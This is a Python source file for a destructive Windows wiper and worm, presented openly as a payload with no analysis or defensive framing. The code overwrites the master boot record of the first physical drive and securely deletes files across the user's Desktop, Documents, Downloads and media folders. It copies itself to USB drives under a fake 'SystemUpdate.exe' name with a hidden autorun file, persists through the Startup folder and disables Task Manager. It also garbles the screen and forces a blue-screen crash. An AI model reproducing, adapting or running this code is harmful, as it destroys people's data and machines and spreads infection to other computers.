import ctypes
import ctypes.wintypes
import os
import sys
import random
import threading
import subprocess
import shutil
import glob
from ctypes import windll, Structure, c_long, byref

# Windows API constants
GMEM_ZEROINIT = 0x0040
SRCCOPY = 0x00CC0020
SM_CXSCREEN = 0
SM_CYSCREEN = 1

# GDI32 and User32 imports
gdi32 = windll.gdi32
user32 = windll.user32
kernel32 = windll.kernel32

class POINT(Structure):
    _fields_ = [("x", c_long), ("y", c_long)]

class MBR_OVERWRITER:
    """Physical Drive 0 MBR Overwrite - Destroys boot sector"""
    
    def __init__(self):
        self.kernel32 = ctypes.windll.kernel32
    
    def destroy_mbr(self):
        try:
            # Open physical drive 0
            hDevice = self.kernel32.CreateFileW(
                "\\\\.\\PhysicalDrive0",
                0x10000000,  # GENERIC_ALL
                0x00000001 | 0x00000002,  # FILE_SHARE_READ | FILE_SHARE_WRITE
                None,
                0x00000003,  # OPEN_EXISTING
                0,
                0
            )
            
            if hDevice == -1:
                return False
            
            # MBR is 512 bytes - fill with random garbage
            mbr_data = bytes([random.randint(0, 255) for _ in range(512)])
            
            # Write to MBR
            written = ctypes.c_ulong(0)
            self.kernel32.WriteFile(hDevice, mbr_data, 512, ctypes.byref(written), None)
            self.kernel32.CloseHandle(hDevice)
            return True
            
        except Exception as e:
            return False

class GDI_EFFECTS:
    """Screen manipulation and visual destruction effects"""
    
    def __init__(self):
        self.user32 = windll.user32
        self.gdi32 = windll.gdi32
        
    def get_screen_dc(self):
        return self.user32.GetDC(0)
    
    def release_dc(self, hdc):
        self.user32.ReleaseDC(0, hdc)
    
    def screen_glitch(self):
        """Random screen inversion and color manipulation"""
        hdc = self.get_screen_dc()
        width = self.user32.GetSystemMetrics(SM_CXSCREEN)
        height = self.user32.GetSystemMetrics(SM_CYSCREEN)
        
        while True:
            x = random.randint(0, width)
            y = random.randint(0, height)
            w = random.randint(50, 300)
            h = random.randint(50, 300)
            
            # BitBlt with various raster operations for glitch effects
            self.gdi32.BitBlt(hdc, x, y, w, h, hdc, x, y, 0x00550009)  # NOTSRCERASE
            self.gdi32.BitBlt(hdc, x, y, w, h, hdc, x, y, 0x00660046)  # SRCINVERT
            
            ctypes.windll.kernel32.Sleep(10)
    
    def screen_melt(self):
        """Classic melting screen effect"""
        hdc = self.get_screen_dc()
        width = self.user32.GetSystemMetrics(SM_CXSCREEN)
        height = self.user32.GetSystemMetrics(SM_CYSCREEN)
        
        while True:
            x = random.randint(0, width)
            y = random.randint(0, height - 20)
            h = random.randint(1, height - y)
            w = random.randint(1, 100)
            
            # Scroll window contents down
            self.user32.ScrollDC(hdc, x, y, w, h, None, None, None)
            ctypes.windll.kernel32.Sleep(5)
    
    def invert_colors(self):
        """Rapid screen color inversion"""
        hdc = self.get_screen_dc()
        width = self.user32.GetSystemMetrics(SM_CXSCREEN)
        height = self.user32.GetSystemMetrics(SM_CYSCREEN)
        
        while True:
            self.gdi32.BitBlt(hdc, 0, 0, width, height, hdc, 0, 0, 0x00550009)
            ctypes.windll.kernel32.Sleep(100)
    
    def draw_random_shapes(self):
        """Draw random destructive patterns"""
        hdc = self.get_screen_dc()
        width = self.user32.GetSystemMetrics(SM_CXSCREEN)
        height = self.user32.GetSystemMetrics(SM_CYSCREEN)
        
        brushes = []
        for _ in range(10):
            color = random.randint(0, 0xFFFFFF)
            brush = self.gdi32.CreateSolidBrush(color)
            brushes.append(brush)
        
        while True:
            brush = random.choice(brushes)
            self.gdi32.SelectObject(hdc, brush)
            
            left = random.randint(0, width)
            top = random.randint(0, height)
            right = left + random.randint(50, 300)
            bottom = top + random.randint(50, 300)
            
            self.gdi32.Rectangle(hdc, left, top, right, bottom)
            ctypes.windll.kernel32.Sleep(1)
    
    def payload_beep(self):
        """Audio payload - system beeps"""
        while True:
            frequency = random.randint(100, 2000)
            duration = random.randint(100, 1000)
            ctypes.windll.kernel32.Beep(frequency, duration)
            ctypes.windll.kernel32.Sleep(random.randint(100, 500))

class FILE_DESTROYER:
    """File system destruction capabilities"""
    
    def __init__(self):
        self.extensions = ['.doc', '.docx', '.pdf', '.txt', '.jpg', '.png', 
                          '.mp3', '.mp4', '.zip', '.rar', '.exe', '.dll']
    
    def overwrite_file(self, filepath):
        """Secure delete by overwriting with random data"""
        try:
            size = os.path.getsize(filepath)
            with open(filepath, 'wb') as f:
                # Overwrite 3 times with different patterns
                for _ in range(3):
                    f.write(bytes([random.randint(0, 255) for _ in range(size)]))
                    f.seek(0)
            os.remove(filepath)
            return True
        except:
            return False
    
    def destroy_directory(self, path):
        """Recursively destroy directory contents"""
        try:
            for root, dirs, files in os.walk(path):
                for file in files:
                    filepath = os.path.join(root, file)
                    self.overwrite_file(filepath)
                for dir in dirs:
                    dirpath = os.path.join(root, dir)
                    try:
                        os.rmdir(dirpath)
                    except:
                        pass
        except:
            pass
    
    def target_user_files(self):
        """Target common user directories"""
        targets = [
            os.path.expanduser('~\\Desktop'),
            os.path.expanduser('~\\Documents'),
            os.path.expanduser('~\\Downloads'),
            os.path.expanduser('~\\Pictures'),
            os.path.expanduser('~\\Music'),
            os.path.expanduser('~\\Videos')
        ]
        
        for target in targets:
            if os.path.exists(target):
                threading.Thread(target=self.destroy_directory, args=(target,)).start()

class WORM_SPREADER:
    """Self-replication and network propagation"""
    
    def __init__(self):
        self.payload_path = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
        self.drives = []
    
    def get_removable_drives(self):
        """Find removable drives for USB spreading"""
        drives = []
        bitmask = kernel32.GetLogicalDrives()
        for letter in range(26):
            if bitmask & (1 << letter):
                drive = chr(65 + letter) + ":\\"
                drive_type = kernel32.GetDriveTypeW(drive)
                if drive_type == 2:  # DRIVE_REMOVABLE
                    drives.append(drive)
        return drives
    
    def infect_usb(self):
        """Spread to USB drives with autorun"""
        while True:
            drives = self.get_removable_drives()
            for drive in drives:
                try:
                    # Copy payload
                    dest = os.path.join(drive, "SystemUpdate.exe")
                    if not os.path.exists(dest):
                        shutil.copy2(self.payload_path, dest)
                        
                        # Create autorun.inf
                        with open(os.path.join(drive, "autorun.inf"), 'w') as f:
                            f.write("[AutoRun]\n")
                            f.write("open=SystemUpdate.exe\n")
                            f.write("label=USB Drive\n")
                            f.write("shellexecute=SystemUpdate.exe\n")
                            f.write("icon=%SystemRoot%\\system32\\shell32.dll,4\n")
                        
                        # Set hidden and system attributes
                        ctypes.windll.kernel32.SetFileAttributesW(dest, 0x02 | 0x04)
                        ctypes.windll.kernel32.SetFileAttributesW(
                            os.path.join(drive, "autorun.inf"), 0x02 | 0x04)
                except:
                    pass
            ctypes.windll.kernel32.Sleep(5000)
    
    def network_scan_simple(self):
        """Simple local network scanning"""
        # Get local IP
        import socket
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        ip_base = '.'.join(local_ip.split('.')[:3]) + '.'
        
        # Scan common IPs
        for i in range(1, 255):
            target = ip_base + str(i)
            threading.Thread(target=self.try_infect, args=(target,)).start()
    
    def try_infect(self, ip):
        """Attempt to spread to target (simplified)"""
        # This would normally include exploit code or credential brute force
        pass
    
    def replicate_to_startup(self):
        """Persistence via startup folder"""
        try:
            startup = os.path.expanduser('~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
            dest = os.path.join(startup, "WindowsUpdate.exe")
            if not os.path.exists(dest):
                shutil.copy2(self.payload_path, dest)
        except:
            pass

class PAYLOAD_MANAGER:
    """Main controller for all destructive components"""
    
    def __init__(self):
        self.mbr = MBR_OVERWRITER()
        self.gdi = GDI_EFFECTS()
        self.files = FILE_DESTROYER()
        self.worm = WORM_SPREADER()
        self.running = True
    
    def disable_protection(self):
        """Disable Windows Defender and Task Manager"""
        try:
            # Disable Task Manager via registry
            import winreg
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, 
                                  r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
        except:
            pass
    
    def elevate_privileges(self):
        """Attempt to gain admin privileges"""
        if ctypes.windll.shell32.IsUserAnAdmin():
            return True
        
        # Re-run as admin
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()
    
    def execute_payload(self):
        """Execute all destructive components"""
        # Disable protections
        self.disable_protection()
        
        # Start worm propagation
        threading.Thread(target=self.worm.infect_usb, daemon=True).start()
        self.worm.replicate_to_startup()
        
        # File destruction
        threading.Thread(target=self.files.target_user_files, daemon=True).start()
        
        # GDI effects (multiple threads for chaos)
        threading.Thread(target=self.gdi.screen_glitch, daemon=True).start()
        threading.Thread(target=self.gdi.screen_melt, daemon=True).start()
        threading.Thread(target=self.gdi.invert_colors, daemon=True).start()
        threading.Thread(target=self.gdi.draw_random_shapes, daemon=True).start()
        threading.Thread(target=self.gdi.payload_beep, daemon=True).start()
        
        # Wait then destroy MBR (final payload)
        ctypes.windll.kernel32.Sleep(30000)  # 30 seconds
        self.mbr.destroy_mbr()
        
        # Force BSOD
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xC0000069, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
    
    def run(self):
        """Entry point"""
        try:
            self.execute_payload()
        except:
            pass

if __name__ == "__main__":
    # Hide console
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    
    payload = PAYLOAD_MANAGER()
    payload.run()
